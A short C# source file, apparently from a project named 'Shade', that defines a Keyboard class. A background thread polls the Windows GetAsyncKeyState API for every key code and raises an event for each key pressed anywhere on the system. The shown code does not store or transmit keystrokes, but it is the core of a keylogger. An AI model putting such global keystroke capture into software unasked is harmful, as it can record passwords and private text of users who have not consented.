using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Shade
{
	public class Keyboard
	{
		private Thread ThreadKeyboard;

		private void ThreadKeyboard_Main()
		{
			while (true)
			{
				Thread.Sleep(10);
				for (int i = 0; i < 255; i++)
				{
					int keyState = GetAsyncKeyState(i);
					if (keyState == 1 || keyState == -32767)
					{
						KeysConverter keysconv = new KeysConverter();
						string key = keysconv.ConvertToString(i);
						KeyPressed(key);
						break;
					}
				}
			}
		}

		[DllImport("user32.dll")]
		public static extern int GetAsyncKeyState(Int32 i);

		public delegate void KeyPressDelegate(string key);
		public event KeyPressDelegate KeyPressed;

		public void Start()
		{
			ThreadKeyboard = new Thread(new ThreadStart(ThreadKeyboard_Main));
			ThreadKeyboard.IsBackground = true;
			ThreadKeyboard.Start();
		}
	}
}
